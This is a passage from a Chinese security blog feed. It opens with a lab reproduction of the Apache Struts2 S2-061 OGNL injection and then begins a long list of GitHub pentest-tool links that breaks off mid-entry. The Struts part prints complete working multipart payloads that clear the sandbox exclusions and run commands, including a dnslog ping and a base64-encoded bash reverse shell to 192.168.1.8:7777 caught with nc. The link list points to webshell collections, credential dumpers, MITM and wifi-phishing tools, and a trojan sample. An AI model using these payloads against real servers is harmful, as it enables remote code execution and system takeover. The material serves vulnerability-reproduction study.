id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h1><p>s2-061漏洞产生的原因是Struts2 会对某些标签属性(比如 <code>id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 <code>%&#123;x&#125;</code> 且 <code>x</code> 的值用户可控时，用户再传入一个 <code>%&#123;payload&#125;</code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过</p><p>进入s2-061的docker环境</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101725120.png" alt="image-20210913101725120"></p><p>还是构造一个<code>%25&#123;10*10&#125;</code>发现运算成功，证明漏洞存在</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101735074.png" alt="image-20210913101735074"></p><p>bp在<code>index.action</code>页面抓包</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101805551.png" alt="image-20210913101805551"></p><p>修改<code>Content-Type</code>如下并添加数据，这里如果直接使用GET方法是得不到回显的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101813523.png" alt="image-20210913101813523"></p><p>改为POST方法即可得到id</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20210913101825067.png" alt="image-20210913101825067"></p><p>配合dnslog食用同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;ping 9vll55.dnslog.cn&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101834104.png" alt="image-20210913101834104"></p><p>bash反弹命令需要先进行编码，同之前操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101847935.png" alt="image-20210913101847935"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwFContent-Disposition: form-data; name=&quot;id&quot;%&#123;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure><p>nc监听端口即可得到反弹shell</p><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20210913101858443.png" alt="image-20210913101858443"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Struts2漏洞复现总结&quot;&gt;&lt;a href=&quot;#Struts2漏洞复现总结&quot; class=&quot;headerlink&quot; title=&quot;Struts2漏洞复现总结&quot;&gt;&lt;/a&gt;Struts2漏洞复现总结&lt;/h1&gt;&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; cla</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Struts2漏洞复现总结" scheme="http://example.com/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>Github渗透测试工具库-2021版</title>
    <link href="http://example.com/2021/08/17/Github%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93-2021%E7%89%88/"/>
    <id>http://example.com/2021/08/17/Github%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%BA%93-2021%E7%89%88/</id>
    <published>2021-08-16T16:23:27.000Z</published>
    <updated>2021-12-14T07:44:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>今天看到一个博客里有这个置顶的工具清单，但是发现这些都是很早以前就有文章发出来的，我爬下来后一直放在txt里吃土。这里一起放出来。</p><h2 id="2-漏洞练习平台"><a href="#2-漏洞练习平台" class="headerlink" title="2.漏洞练习平台"></a>2.漏洞练习平台</h2><p>WebGoat漏洞练习平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WebGoat/WebGoat</span><br></pre></td></tr></table></figure><p>webgoat-legacy漏洞练习平台:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WebGoat/WebGoat-Legacy</span><br></pre></td></tr></table></figure><p>zvuldirll漏洞练习平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/710leo/ZVulDrill</span><br></pre></td></tr></table></figure><p>vulapps漏洞练习平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Medicean/VulApps</span><br></pre></td></tr></table></figure><p>dvwa漏洞练习平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/RandomStorm/DVWA</span><br></pre></td></tr></table></figure><p>数据库注入练习平台 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Audi-1/sqli-labs</span><br></pre></td></tr></table></figure><p>用node编写的漏洞练习平台，like OWASP NodeGoat：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cr0hn/vulnerable-node</span><br></pre></td></tr></table></figure><p>Ruby编写的一款工具，生成含漏洞的虚拟机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cliffe/secgen</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="3-花式扫描器"><a href="#3-花式扫描器" class="headerlink" title="3.花式扫描器"></a>3.花式扫描器</h2><p>Nmap端口扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nmap/nmap</span><br></pre></td></tr></table></figure><p>本地网络扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SkyLined/LocalNetworkScanner</span><br></pre></td></tr></table></figure><p>子域名扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br><span class="line">https://github.com/aboul3la/Sublist3r</span><br><span class="line">https://github.com/TheRook/subbrut</span><br><span class="line">ehttps://github.com/infosec-au/altdns</span><br></pre></td></tr></table></figure><p>Linux漏洞扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/future-architect/vuls</span><br></pre></td></tr></table></figure><p>基于端口扫描以及关联CVE:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/m0nad/HellRaiser</span><br></pre></td></tr></table></figure><p>漏洞路由扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jh00nbr/Routerhunter-2.0</span><br></pre></td></tr></table></figure><p>迷你批量信息泄漏扫描脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/BBScan</span><br></pre></td></tr></table></figure><p>Waf类型检测工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br></pre></td></tr></table></figure><p>服务器端口弱口令扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wilson9x1/fenghuangscanner_v3</span><br></pre></td></tr></table></figure><p>Fox-scan扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fengxuangit/Fox-scan/</span><br></pre></td></tr></table></figure><h2 id="4-信息搜集工具"><a href="#4-信息搜集工具" class="headerlink" title="4.信息搜集工具"></a>4.信息搜集工具</h2><p>社工收集器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0tr00t/Sreg</span><br></pre></td></tr></table></figure><p>Github信息搜集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sea-god/gitscan</span><br></pre></td></tr></table></figure><p>github Repo信息搜集工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/metac0rtex/GitHarvester</span><br></pre></td></tr></table></figure><p>信息探测及扫描工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/darryllane/Bluto</span><br></pre></td></tr></table></figure><p>内部网络信息扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sowish/LNScan</span><br></pre></td></tr></table></figure><p>远程桌面登录扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/linuz/Sticky-Keys-Slayer</span><br></pre></td></tr></table></figure><p>网络基础设施渗透工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SECFORCE/sparta</span><br></pre></td></tr></table></figure><p>SNMAP密码破解:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SECFORCE/SNMP-Brute</span><br></pre></td></tr></table></figure><h2 id="5-WEB"><a href="#5-WEB" class="headerlink" title="5.WEB"></a>5.WEB</h2><p>webshell大合集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tennc/webshell</span><br></pre></td></tr></table></figure><p>渗透以及web攻击脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/brianwrf/hackUtils</span><br></pre></td></tr></table></figure><p>web渗透小工具大合集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rootphantomer/hacktoolsfor_me</span><br></pre></td></tr></table></figure><p>XSS数据接收平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/firesunCN/BlueLotus_XSSReceiver</span><br></pre></td></tr></table></figure><p>XSS与CSRF工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/evilcos/xssor</span><br></pre></td></tr></table></figure><p>xss多功能扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shawarkhanethicalhacker/BruteXSS</span><br></pre></td></tr></table></figure><p>web漏洞扫描器:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/andresriancho/w3af</span><br></pre></td></tr></table></figure><p>WEB漏洞扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sullo/nikto</span><br></pre></td></tr></table></figure><p>渗透常用小工具包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/leonteale/pentestpackage</span><br></pre></td></tr></table></figure><p>web目录扫描器:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/maurosoria/dirsearch</span><br></pre></td></tr></table></figure><p>web向命令注入检测工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/stasinopoulos/commix</span><br></pre></td></tr></table></figure><p>自动化SQL注入检查工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure><p>SSL扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rbsec/sslscan</span><br></pre></td></tr></table></figure><p>安全工具集合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/codejanus/ToolSuite</span><br></pre></td></tr></table></figure><p>apache日志分析器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mthbernardes/ARTLAS</span><br></pre></td></tr></table></figure><p>php代码审计工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pwnsdx/BadCode</span><br></pre></td></tr></table></figure><p>web指纹识别扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/urbanadventurer/whatweb</span><br></pre></td></tr></table></figure><p>检查网站恶意攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ciscocsirt/malspider</span><br></pre></td></tr></table></figure><p>wordprees漏洞扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wpscanteam/wpscan</span><br></pre></td></tr></table></figure><p>固件漏洞扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/misterch0c/firminator_backend</span><br></pre></td></tr></table></figure><p>数据库注入工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sqlmapproject/sqlmap</span><br></pre></td></tr></table></figure><p>Web代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zt2/sqli-hunter</span><br></pre></td></tr></table></figure><p>新版中国菜刀：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Chora10/Cknife</span><br></pre></td></tr></table></figure><p>git泄露利用EXP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/GitHack</span><br></pre></td></tr></table></figure><p>浏览器攻击框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/beefproject/beef</span><br></pre></td></tr></table></figure><p>自动化绕过WAF脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/khalilbijjou/WAFNinjahttps://github.com/owtf/wafbypasser</span><br></pre></td></tr></table></figure><p>一款开源WAF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SpiderLabs/ModSecurity</span><br></pre></td></tr></table></figure><p>http命令行客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jkbrzt/httpie</span><br></pre></td></tr></table></figure><p>浏览器调试利器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/firebug/firebug</span><br></pre></td></tr></table></figure><p>DISCUZ漏洞扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/code-scan/dzscan</span><br></pre></td></tr></table></figure><p>自动化代码审计工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wufeifei/cobra</span><br></pre></td></tr></table></figure><p>浏览器攻击框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/julienbedard/browsersploit</span><br></pre></td></tr></table></figure><p>tomcat自动后门部署：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mgeeky/tomcatWarDeployer</span><br></pre></td></tr></table></figure><p>网络空间指纹扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nanshihui/Scan-T</span><br></pre></td></tr></table></figure><p>burpsuit之J2EE扫描插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ilmila/J2EEScan</span><br></pre></td></tr></table></figure><h2 id="6-Windows域渗透工具"><a href="#6-Windows域渗透工具" class="headerlink" title="6.Windows域渗透工具"></a>6.Windows域渗透工具</h2><p>mimikatz明文注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gentilkiwi/mimikatz</span><br></pre></td></tr></table></figure><p>Powershell渗透库合集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit</span><br></pre></td></tr></table></figure><p>Powershell tools合集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/clymb3r/PowerShell</span><br></pre></td></tr></table></figure><p>powershell的mimikittenz:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/putterpanda/mimikittenz</span><br></pre></td></tr></table></figure><p>域渗透教程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/l3m0n/pentest_study</span><br></pre></td></tr></table></figure><h2 id="7-Fuzz"><a href="#7-Fuzz" class="headerlink" title="7.Fuzz"></a>7.Fuzz</h2><p>Web向Fuzz工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/xmendez/wfuzz</span><br></pre></td></tr></table></figure><p>HTTP暴力破解，撞库攻击脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/htpwdScan</span><br></pre></td></tr></table></figure><h2 id="8-漏洞利用及攻击框架"><a href="#8-漏洞利用及攻击框架" class="headerlink" title="8.漏洞利用及攻击框架"></a>8.漏洞利用及攻击框架</h2><p>msf框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rapid7/metasploit-framework</span><br></pre></td></tr></table></figure><p>pocsscan攻击框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/erevus-cn/pocscan</span><br></pre></td></tr></table></figure><p>Pocsuite攻击框架:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/knownsec/Pocsuite</span><br></pre></td></tr></table></figure><p>Beebeeto攻击框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0tr00t/Beebeeto-framework</span><br></pre></td></tr></table></figure><p>漏洞POC&amp;EXP:ExploitDB官方git版本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploit-database</span><br></pre></td></tr></table></figure><p>php漏洞代码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/80vul/phpcodz</span><br></pre></td></tr></table></figure><p>CVE-2016-2107:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FiloSottile/CVE-2016-2107</span><br></pre></td></tr></table></figure><p>CVE-2015-7547 POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fjserna/CVE-2015-7547</span><br></pre></td></tr></table></figure><p>JAVA反序列化POC生成工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>JAVA反序列化EXP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/foxglovesec/JavaUnserializeExploits</span><br></pre></td></tr></table></figure><p>Jenkins CommonCollections EXP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/CaledoniaProject/jenkins-cli-exploit</span><br></pre></td></tr></table></figure><p>CVE-2015-2426 EXP (windows内核提权):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vlad902/hacking-team-windows-kernel-lpe</span><br></pre></td></tr></table></figure><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hxer/vulnapp</span><br></pre></td></tr></table></figure><p>php7缓存覆写漏洞Demo及相关工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GoSecure/php7-opcache-override</span><br></pre></td></tr></table></figure><p>XcodeGhost木马样本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/XcodeGhostSource/XcodeGhost</span><br></pre></td></tr></table></figure><h2 id="9-中间人攻击及钓鱼"><a href="#9-中间人攻击及钓鱼" class="headerlink" title="9.中间人攻击及钓鱼"></a><strong>9.中间人攻击及钓鱼</strong></h2><p>中间人攻击框架:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secretsquirrel/the-backdoor-factory</span><br><span class="line">https://github.com/secretsquirrel/BDFProxy</span><br><span class="line">https://github.com/byt3bl33d3r/MITMf</span><br></pre></td></tr></table></figure><p>Inject code, jam wifi, and spy on wifi users:<a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/intrepidusgroup/mallory</span><br></pre></td></tr></table></figure><p>wifi钓鱼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sophron/wifiphisher</span><br></pre></td></tr></table></figure><h2 id="10-密码破解"><a href="#10-密码破解" class="headerlink" title="10.密码破解"></a>10.密码破解</h2><p>密码破解工具:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shinnok/johnny</span><br></pre></td></tr></table></figure><p>本地存储的各类密码提取利器:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AlessandroZ/LaZagne</span><br></pre></td></tr></table></figure><h2 id="11-二进制及代码分析工具"><a href="#11-二进制及代码分析工具" class="headerlink" title="11.二进制及代码分析工具"></a>11.二进制及代码分析工具</h2><p>二进制分析工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/devttys0/binwalk</span><br></pre></td></tr></table></figure><p>系统扫描器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/quarkslab/binmap</span><br></pre></td></tr></table></figure><p>rp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/0vercl0k/rp</span><br></pre></td></tr></table></figure><p>Windows 